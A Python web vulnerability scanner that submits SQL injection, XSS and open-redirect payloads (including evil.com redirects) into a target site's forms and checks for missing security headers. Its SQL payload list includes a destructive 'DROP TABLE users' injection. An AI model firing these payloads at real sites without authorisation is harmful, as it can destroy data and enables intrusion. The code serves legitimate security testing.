import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import sys

# === SQL Injection Payloads ===
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "\" OR 1=1 --"]

# === XSS Payloads ===
xss_payloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '"><iframe src=javascript:alert(1)>'
]

# === Open Redirect Payloads ===
redirect_payloads = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com@trusted.com"
]

# === Security Headers to Check ===
SECURITY_HEADERS = [
    "X-Frame-Options",
    "Content-Security-Policy",
    "X-XSS-Protection",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy"
]

# === Logging Setup ===
LOG_FILE = "scan_results.txt"

def log_result(message):
    """Logs a message to the log file."""
    with open(LOG_FILE, "a", encoding="utf-8") as log:
        log.write(message + "\n")

def is_valid_url(url):
    try:
        result = urlparse(url)
        return result.scheme and result.netloc
    except:
        return False

def get_forms(url):
    try:
        res = requests.get(url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        error_message = f"[!] Error fetching forms from {url}: {e}"
        print(error_message)
        log_result(error_message)
        return []

def form_details(form):
    details = {}
    action = form.attrs.get("action", "")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        if input["type"] == "text" or input["type"] == "search":
            data[input["name"]] = value
        else:
            data[input["name"]] = "test"
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, timeout=10)
        else:
            return requests.get(target_url, params=data, timeout=10)
    except Exception as e:
        error_message = f"[!] Error submitting form to {target_url}: {e}"
        print(error_message)
        log_result(error_message)
        return None

def scan_sql_injection(url):
    print("\n[🔍] Scanning for SQL Injection...")
    log_result("\n[🔍] Scanning for SQL Injection...")
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in sql_payloads:
            response = submit_form(details, url, payload)
            if response and ("sql syntax" in response.text.lower() or "mysql" in response.text.lower()):
                result_message = f"[‼️] Possible SQL Injection at {url}\n     Payload: {payload}"
                print(result_message)
                log_result(result_message)
                break

def scan_xss(url):
    print("\n[🔍] Scanning for XSS...")
    log_result("\n[🔍] Scanning for XSS...")
    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in xss_payloads:
            response = submit_form(details, url, payload)
            if response and (payload in response.text or "alert(1)" in response.text):
                result_message = f"[‼️] Possible XSS at {url}\n     Payload: {payload}"
                print(result_message)
                log_result(result_message)
                break

def check_security_headers(url):
    print("\n[🔍] Checking Security Headers...")
    log_result("\n[🔍] Checking Security Headers...")
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers

        missing_headers = []
        for header in SECURITY_HEADERS:
            if header not in headers:
                missing_headers.append(header)

        if missing_headers:
            result_message = f"[⚠️] Missing Security Headers at {url}:\n    - " + "\n    - ".join(missing_headers)
            print(result_message)
            log_result(result_message)
        else:
            print("[✅] All important security headers are present.")
            log_result("[✅] All important security headers are present.")

    except Exception as e:
        error_message = f"[!] Error fetching security headers from {url}: {e}"
        print(error_message)
        log_result(error_message)

def scan_open_redirect(url):
    print("\n[🔍] Scanning for Open Redirect Vulnerabilities...")
    log_result("\n[🔍] Scanning for Open Redirect Vulnerabilities...")

    forms = get_forms(url)
    for form in forms:
        details = form_details(form)
        for payload in redirect_payloads:
            response = submit_form(details, url, payload)
            if response and payload in response.url:
                result_message = f"[‼️] Possible Open Redirect at {url}\n     Redirects to: {response.url}"
                print(result_message)
                log_result(result_message)
                break

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python scanner.py <url>")
        sys.exit(1)

    target_url = sys.argv[1]

    if not is_valid_url(target_url):
        print("[!] Invalid URL format.")
        sys.exit(1)

    print(f"[🚀] Starting scan on {target_url}")
    log_result(f"[🚀] Starting scan on {target_url}")

    scan_sql_injection(target_url)
    scan_xss(target_url)
    check_security_headers(target_url)
    scan_open_redirect(target_url)

    print(f"\n[📄] Scan complete. Results saved to: {LOG_FILE}")
    log_result("\n[📄] Scan complete. Results saved to scan_results.txt")
